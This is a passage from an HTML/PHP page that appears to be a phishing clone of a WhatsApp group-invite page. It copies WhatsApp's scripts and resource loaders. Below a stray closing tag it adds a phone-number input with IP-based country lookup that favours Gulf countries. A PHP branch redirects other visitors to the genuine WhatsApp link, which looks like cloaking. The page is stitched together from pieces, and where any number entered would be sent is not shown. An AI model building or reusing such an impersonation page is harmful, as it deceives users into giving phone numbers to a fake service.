"TOK2ldv", "sVPS\/Mn", "1kJuRsc", "SvmLjNk", "JtkljLi", "WanF+UU", "zr67Htb", "GmCQyaS", "3tlrpJp", "6yux5SW", "Q2l4aoI", "Ko1cKDd", "Tu5s6dr", "tv8\/vX6", "GYGLVxo", "vTTlQAt", "TuSYMUj", "aX4hBY6", "tPNLbB9", "QKv73eH", "D015dWO", "vgA9nU\/", "KuwsnTV", "KoX\/E3T", "bw6MGwz", "GwBXZUn", "qfnD9zq", "d5eYz5g", "vWesky0", "uUjQ7we", "j\/XsUIg", "Ey6mHpi", "Fi5sBpO", "XPcpyu6", "bSjqUUk", "TCB9Qwo", "g1zCxxM", "BzG49vA", "B9E2hQ3", "ixJlOyY", "tmmYm+p", "gAZiqKY", "OFUGTbV", "E92YjfF", "Y5HYnPP", "KZ\/2jeM", "KIDbqzs", "dOa+Jlx", "Gya5ZSH", "zuJ\/ghe", "fUlW\/15", "Mxxii9o", "xt2YgCu", "1V5EPFu", "rkQHihK", "99LBMn6", "8+\/m\/R9", "STfNYsg", "b+4kH42", "HrSvOcT", "aIstZuG", "6V5ZFvF", "SGCN92C", "61rx7+d", "epaoL7R", "Bn6kaAZ", "EU6jX7P", "Y+PD8c3", "VgOUvrQ", "9EKSmsD", "u5lyyOe", "oPTgYNC", "kw5YG6Z", "iXU77vs", "i4V1d53", "kNttvqJ", "40aXr\/b", "TsDff51", "yr4qxCD", "ZHZnXPn", "VXCD52p", "DaD8skW", "xB+TaRO", "uWEusKp", "DQmdiRz", "uFDQd9Z", "ivm3jVT", "+C4BHgQ", "UGTwlNg", "DnM4VSi", "V4\/tJwL", "JLlf7u3", "51mNzYG", "BhuDPkW", "2aXIT1s", "45AtGCk", "W+kpw\/V", "feyvgDh", "Gh+H9RS", "K4SDM8k", "DU1B2pz", "B3sWwr7", "ww+w9NB", "PGutlQF", "UF5pltP", "s7WzdL2", "w5q5DHx", "6ku9nZE", "xFHZgv9", "myoEjXm", "Np\/ciaH", "\/dzE2U7", "IaiwPb6", "Yv4igak", "recrjyN", "SgxDRYO", "CoZ7z1c", "n59fAvB", "50dJNkk", "GBsqA5T", "PGpT5pq", "c\/aMCaq", "kbZhs3d", "y0Iwg2a", "zsOiNh9", "kYf2oUE", "7xqofE\/", "uRqYN+Z", "umbcXp9", "YcXejuk", "hUzOO1y", "aQRm3ei", "4cmVdzc", "VJ1spXI", "3QBOKTC"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions", "Animation"]
                            },
                            "be": 1
                        },
                        "PhotoTags": {
                            "r": ["6Vxclga", "aLWBuAr", "rlbiS2R", "xoY0m2s", "yMgn4BF", "XuAdEtr"],
                            "be": 1
                        },
                        "TagTokenizer": {
                            "r": ["6Vxclga", "aLWBuAr", "zGvX4V8", "2aXIT1s", "45AtGCk", "W+kpw\/V", "feyvgDh", "41Ne5YX", "M9rh1r7", "VB4zTC3", "PqmsMWA", "gB3Zq0N", "H+Qbnws", "zmDkAi9", "rFUfoY0", "77m8Uso", "YOIvG\/m", "J62RfGM", "88+gRST", "HBK9MF6", "XuAdEtr"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                            },
                            "be": 1
                        },
                        "AsyncDialog": {
                            "r": ["6Vxclga", "aLWBuAr", "PKg8B8N", "15HqZfD", "zmDkAi9", "tv8\/vX6", "Twm7E77", "H+Qbnws", "zGvX4V8", "PqmsMWA", "XuAdEtr", "qoH5vyV", "gB3Zq0N", "9sdrxzZ", "xoY0m2s", "R5w1rCJ", "2HxWSIu"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                            },
                            "be": 1
                        },
                        "Hovercard": {
                            "r": ["6Vxclga", "aLWBuAr", "zGvX4V8", "PqmsMWA", "gB3Zq0N", "U1M\/Y3Q", "PKg8B8N", "15HqZfD", "zmDkAi9", "79gAk58", "Twm7E77", "R5w1rCJ", "H+Qbnws", "xoY0m2s", "2HxWSIu", "XuAdEtr", "qoH5vyV", "9sdrxzZ", "Kfkjcy2", "lpxjhwr", "woU7G1a", "18tbGeA", "sJhkEUj", "fQwhlTT", "JIYg9tN", "hmc0Ch2", "ipCbG2E", "yyJPDys", "P1UUTmY", "aHchuMx"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions", "Animation"]
                            },
                            "be": 1
                        },
                        "XSalesPromoWWWDetailsDialogAsyncController": {
                            "r": ["gWMJgTe"],
                            "be": 1
                        },
                        "XOfferController": {
                            "r": ["hIek+bG"],
                            "be": 1
                        },
                        "PerfXSharedFields": {
                            "r": ["zmDkAi9", "zGvX4V8"],
                            "be": 1
                        },
                        "ODS": {
                            "r": ["6Vxclga", "zmDkAi9"],
                            "be": 1
                        },
                        "Dialog": {
                            "r": ["aLWBuAr", "H+Qbnws", "6Vxclga", "PKg8B8N", "9sdrxzZ", "gB3Zq0N", "xoY0m2s", "Twm7E77", "zGvX4V8", "PqmsMWA", "zmDkAi9", "15HqZfD", "0jD5daf", "lGcuWFY", "XuAdEtr", "R5w1rCJ", "2HxWSIu"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent", "Animation", "PageTransitions", "BanzaiScuba_DEPRECATED"]
                            },
                            "be": 1
                        },
                        "ExceptionDialog": {
                            "r": ["15HqZfD", "zmDkAi9", "tv8\/vX6", "6Vxclga", "aLWBuAr", "Twm7E77", "H+Qbnws", "zGvX4V8", "PqmsMWA", "XuAdEtr", "qoH5vyV", "gB3Zq0N", "9sdrxzZ", "xoY0m2s", "54wQgQE", "R5w1rCJ", "QKv73eH", "PKg8B8N", "3d8QUxd", "5A7Htgh", "woU7G1a", "20549oV", "2HxWSIu"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                            },
                            "be": 1
                        },
                        "QuickSandSolver": {
                            "r": ["6Vxclga", "aLWBuAr", "PKg8B8N", "H+Qbnws", "zmDkAi9", "15HqZfD", "8ELCBwH", "1tEzGmI", "SWx3yNv", "x22Oby4", "XuAdEtr", "gB3Zq0N"],
                            "rds": {
                                "m": ["FbtLogging", "IntlQtEventFalcoEvent"]
                            },
                            "be": 1
                        },
                        "ConfirmationDialog": {
                            "r": ["6Vxclga", "aLWBuAr", "H+Qbnws", "zmDkAi9", "15HqZfD", "G2yK9wR", "XuAdEtr"],
                            "be": 1
                        }
                    }
                })
            });
        </script>
        <script>
            requireLazy(["InitialJSLoader"], function(InitialJSLoader) {
                InitialJSLoader.loadOnDOMContentReady(["6Vxclga", "aLWBuAr", "zmDkAi9", "PKg8B8N", "8TNZYzX"]);
            });
        </script>
        <script>
            requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
                var s = (new ServerJS());
                s.handle({
                    "elements": [
                        ["__elem_bb0debb2_0_0_mK", "u_0_0_XR", 1],
                        ["__elem_a588f507_0_1_QO", "u_0_1_R7", 1],
                        ["__elem_bb0debb2_0_1_yF", "u_0_2_Le", 1],
                        ["__elem_a588f507_0_0_L+", "u_0_3_8q", 1],
                        ["__elem_bb0debb2_0_2_pu", "u_0_4_J6", 1],
                        ["__elem_7af142ae_0_0_vG", "u_0_5_Ts", 1],
                        ["__elem_bb0debb2_0_3_KZ", "u_0_6_Eo", 1],
                        ["__elem_11edcf69_0_0_Rz", "u_0_7_\/e", 1]
                    ],
                    "require": [
                        ["WhatsAppApiOpenUrl", "open_custom_url", [],
                            [{
                                "url": "whatsapp:\/\/chat\/?code=KWV8T3ugsHH1unqZelMZ3k",
                                "userAgentMetadata": {
                                    "browser": "Other",
                                    "isMobile": false,
                                    "isTablet": false
                                },
                                "shouldAutoload": false
                            }]
                        ],
                        ["ScriptPath", "set", [],
                            ["WAXWhatsAppChatInviteController", "a1f3c513", {
                                "imp_id": "1729FBE9byZOWAAfx",
                                "ef_page": null,
                                "uri": "https:\/\/chat.whatsapp.com\/--sanitized-S228802--"
                            }]
                        ],
                        ["WhatsAppFAQClientListener", "attachGetInTouchClickListener", [],
                            ["e9776899-4e19-40fa-9163-90adbae97807"]
                        ],
                        ["WAUILanguagePickerController", "init", ["__elem_bb0debb2_0_0_mK", "__elem_a588f507_0_0_L+", "__elem_bb0debb2_0_1_yF", "__elem_a588f507_0_1_QO"],
                            [{
                                "toggle": {
                                    "__m": "__elem_bb0debb2_0_0_mK"
                                },
                                "background": {
                                    "__m": "__elem_a588f507_0_0_L+"
                                },
                                "minimize": {
                                    "__m": "__elem_bb0debb2_0_1_yF"
                                },
                                "wrapper": {
                                    "__m": "__elem_a588f507_0_1_QO"
                                }
                            }]
                        ],
                        ["WAUIHamburgerMenu", "init", ["__elem_bb0debb2_0_2_pu", "__elem_bb0debb2_0_3_KZ", "__elem_7af142ae_0_0_vG"],
                            [{
                                "openButton": {
                                    "__m": "__elem_bb0debb2_0_2_pu"
                                },
                                "closeButton": {
                                    "__m": "__elem_bb0debb2_0_3_KZ"
                                },
                                "container": {
                                    "__m": "__elem_7af142ae_0_0_vG"
                                }
                            }]
                        ],
                        ["WAUILanguageSelectDropdown", "init", ["__elem_11edcf69_0_0_Rz"],
                            [{
                                "__m": "__elem_11edcf69_0_0_Rz"
                            }]
                        ],
                        ["TimeSliceImpl"],
                        ["HasteSupportData"],
                        ["ServerJS"],
                        ["Run"],
                        ["InitialJSLoader"]
                    ]
                });
                requireLazy(["Run"], function(Run) {
                    Run.onAfterLoad(function() {
                        s.cleanup(TimeSlice)
                    })
                });
            });
        </script>
        <script>
            now_inl = (function() {
                var p = window.performance;
                return p && p.now && p.timing && p.timing.navigationStart ? function() {
                    return p.now() + p.timing.navigationStart
                } : function() {
                    return new Date().getTime()
                };
            })();
            window.__bigPipeFR = now_inl();
        </script>
        <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/yC/l/1,cross/iZFW4Wn89pz.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
        <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/yC/l/1,cross/r26wQn7wvRV.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
        <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/y-/l/1,cross/rzCGGQRrwOw.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
        <link rel="preload" href="https://static.whatsapp.net/rsrc.php/v3/yo/l/1,cross/28bZN702Ikw.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
        <script>
            window.__bigPipeCtor = now_inl();
            requireLazy(["BigPipe"], function(BigPipe) {
                define("__bigPipe", [], window.bigPipe = new BigPipe({
                    "forceFinish": true,
                    "config": null
                }));
            });
        </script>
        <script nonce="">
            (function() {
                var n = now_inl();
                requireLazy(["__bigPipe"], function(bigPipe) {
                    bigPipe.beforePageletArrive("first_response", n);
                })
            })();
        </script>
        <script nonce="">
            requireLazy(["__bigPipe"], (function(bigPipe) {
                bigPipe.onPageletArrive({
                    displayResources: ["lR1wO42", "XuAdEtr", "gB3Zq0N", "b5NZ1WW"],
                    id: "first_response",
                    phase: 0,
                    last_in_phase: true,
                    tti_phase: 0,
                    hsrp: {
                        hblp: {
                            consistency: {
                                rev: 1006770746
                            }
                        }
                    },
                    allResources: ["lR1wO42", "XuAdEtr", "gB3Zq0N", "6Vxclga", "aLWBuAr", "zmDkAi9", "PKg8B8N", "b5NZ1WW", "8TNZYzX"]
                });
            }));
        </script>
        <script>
            requireLazy(["__bigPipe"], function(bigPipe) {
                bigPipe.setPageID("7180743252192495205")
            });
        </script>
        <script nonce="">
            (function() {
                var n = now_inl();
                requireLazy(["__bigPipe"], function(bigPipe) {
                    bigPipe.beforePageletArrive("last_response", n);
                })
            })();
        </script>
        <script nonce="">
            requireLazy(["__bigPipe"], (function(bigPipe) {
                bigPipe.onPageletArrive({
                    displayResources: ["zmDkAi9", "gB3Zq0N"],
                    id: "last_response",
                    phase: 1,
                    last_in_phase: true,
                    the_end: true,
                    jsmods: {
                        define: [
                            ["BrowserPaymentHandlerConfig", [], {
                                enabled: false
                            }, 3904],
                            ["TimeSpentConfig", [], {
                                delay: 1000,
                                timeout: 64,
                                "0_delay": 0,
                                "0_timeout": 8
                            }, 142],
                            ["TrackingConfig", [], {
                                domain: "https://pixel.facebook.com"
                            }, 325],
                            ["cr:1642797", ["BanzaiBase"], {
                                __rc: ["BanzaiBase", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                            }, -1],
                            ["cr:1353359", ["EventListenerImplForBlue"], {
                                __rc: ["EventListenerImplForBlue", "Aa1M-ngm46wg5VJr9p5j45zVdpHHLobSy4tImDdBPaBz-xsRCd-jXBxACqqxFDmx12nxt1PB8rwxen0eyFG3yJ4X6_C2aLbPqQ"]
                            }, -1],
                            ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], {
                                __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                            }, -1],
                            ["cr:1187159", ["BlueCompatBroker"], {
                                __rc: ["BlueCompatBroker", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                            }, -1],
                            ["cr:1634616", ["UserActivityBlue"], {
                                __rc: ["UserActivityBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                            }, -1],
                            ["BanzaiConfig", [], {
                                MAX_SIZE: 10000,
                                MAX_WAIT: 150000,
                                MIN_WAIT: null,
                                RESTORE_WAIT: 150000,
                                blacklist: ["time_spent"],
                                disabled: false,
                                gks: {
                                    boosted_pagelikes: true,
                                    mercury_send_error_logging: true,
                                    platform_oauth_client_events: true,
                                    graphexplorer: true,
                                    sticker_search_ranking: true
                                },
                                known_routes: ["artillery_javascript_actions", "artillery_javascript_trace", "artillery_logger_data", "logger", "falco", "gk2_exposure", "js_error_logging", "loom_trace", "marauder", "perfx_custom_logger_endpoint", "qex", "require_cond_exposure_logging"],
                                should_drop_unknown_routes: true,
                                should_log_unknown_routes: false
                            }, 7],
                            ["ImmediateActiveSecondsConfig", [], {
                                sampling_rate: 0
                            }, 423],
                            ["cr:692209", ["cancelIdleCallbackBlue"], {
                                __rc: ["cancelIdleCallbackBlue", "Aa2kZayVJ8majSUYkxQXAdEjQ1SJBKwvECA_P3jM9TAzOnQUAjBOZx39EkuBKynxfhp0ya7UFQMA_PZGO2nv0yMZAYs"]
                            }, -1]
                        ],
                        require: [
                            ["NavigationMetrics", "setPage", [],
                                [{
                                    page: "WAXWhatsAppChatInviteController",
                                    page_type: "normal",
                                    page_uri: "https://chat.whatsapp.com/KWV8T3ugsHH1unqZelMZ3k",
                                    serverLID: "7180743252192495205"
                                }]
                            ],
                            ["FalcoLoggerTransports", "attach", [],
                                []
                            ],
                            ["Chromedome", "start", [],
                                [{}]
                            ],
                            ["DimensionTracking"],
                            ["NavigationClickPointHandler"],
                            ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                                []
                            ],
                            ["Artillery", "disable", [],
                                []
                            ],
                            ["ScriptPathLogger", "startLogging", [],
                                []
                            ],
                            ["TimeSpentBitArrayLogger", "init", [],
                                []
                            ],
                            ["ClickRefLogger"],
                            ["DetectBrokenProxyCache", "run", [],
                                [0, "c_user"]
                            ],
                            ["RequireDeferredReference", "unblock", [],
                                [
                                    ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"], "sd"
                                ]
                            ],
                            ["RequireDeferredReference", "unblock", [],
                                [
                                    ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED"], "css"
                                ]
                            ]
                        ]
                    },
                    hsrp: {
                        hsdp: {
                            clpData: {
                                "1829319": {
                                    r: 1
                                },
                                "1829320": {
                                    r: 1
                                },
                                "1843988": {
                                    r: 1
                                }
                            }
                        },
                        hblp: {
                            consistency: {
                                rev: 1006770746
                            },
                            compMap: {
                                TransportSelectingClientSingleton: {
                                    r: ["zmDkAi9", "U1M/Y3Q"],
                                    rds: {
                                        m: ["ContextualConfig", "BladeRunnerClient", "DGWRequestStreamClient", "MqttLongPollingRunner", "BanzaiScuba_DEPRECATED"],
                                        r: ["15HqZfD", "aX4hBY6", "6Vxclga", "H+Qbnws", "2HxWSIu", "PKg8B8N", "aLWBuAr"]
                                    },
                                    be: 1
                                },
                                RequestStreamCommonRequestStreamCommonTypes: {
                                    r: ["zmDkAi9"],
                                    be: 1
                                }
                            }
                        }
                    },
                    allResources: ["zmDkAi9", "gB3Zq0N", "15HqZfD", "6Vxclga", "aLWBuAr"]
                });
            }));
        </script>

</script>
        
        <script src="build/js/intlTelInput.js"></script>
<script>
  var input = document.querySelector("#phone");
  window.intlTelInput(input, {
    // allowDropdown: false,
    // autoHideDialCode: false,
    // autoPlaceholder: "off",
    // dropdownContainer: document.body,
    // excludeCountries: ["us"],
    // formatOnDisplay: false,
   geoIpLookup: function(callback) {
      $.get("http://ipinfo.io", function() {}, "jsonp").always(function(resp) {
      var countryCode = (resp && resp.country) ? resp.country : "";
      callback(countryCode);
     });
     },
    // hiddenInput: "full_number",
   //  initialCountry: "auto",
    // localizedCountries: { 'de': 'Deutschland' },
    // nationalMode: false,
    // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
    // placeholderNumberType: "MOBILE",
    preferredCountries: ['sa', 'ae', 'qa','om','bh','sa','ma'],
    separateDialCode: true,
    defaultCountry: "sa",
    utilsScript: "build/js/utils.js",
  });
</script>
    </body>

    </html>

<?php
} else {


    header('location :https://chat.whatsapp.com/--sanitized-S228802--?lang=ar');
}
?>